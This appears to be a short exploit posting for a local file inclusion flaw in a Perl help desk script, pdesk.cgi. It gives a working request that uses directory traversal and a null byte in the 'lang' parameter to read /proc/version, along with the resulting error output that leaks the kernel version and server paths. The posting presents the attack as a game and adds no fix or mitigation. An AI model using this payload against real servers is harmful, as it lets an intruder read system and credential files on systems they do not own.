[Information]

to streamline the operation of managing emails or support requests, with built in tracking 
and response logging it is an ideal help desk solution for companies with one or more members 
of staff or for those who want to organise client support.

[Bug]

Bug is in Inclusion in lang. 

Http://server/cgi-bin/pdesk.cgi?lang=h4x0rs%20Rul3z

Can't locate include/lang/h4x0rs Rul3z.inc in @INC (@INC contains: include/mods /etc/perl /usr/lib/perl5/site_perl/5.8.0/i686-linux /usr/lib/perl5/site_perl/5.8.0 /usr/lib/perl5/site_perl /usr/lib/perl5/vendor_perl/5.8.0/i686-linux /usr/lib/perl5/vendor_perl/5.8.0 /usr/lib/perl5/vendor_perl /usr/lib/perl5/5.8.0/i686-linux /usr/lib/perl5/5.8.0 /usr/local/lib/site_perl .) at /home/httpd/html/***.****.***/cgi-bin/pdesk.cgi line 56. 

But if you use: pdesk.cgi?lang=[file]%00 :

Http://server/cgi-bin/pdesk.cgi?lang=../../../../../../../proc/version%00
syntax error at include/lang/../../../../../../../proc/version line 1, near "2.4.21 (" Compilation failed in require at /home/httpd/html/***.****.***/cgi-bin/pdesk.cgi line 56. 

If you read error, you can see Version of Kernel "2.4.21".
...I love this game...
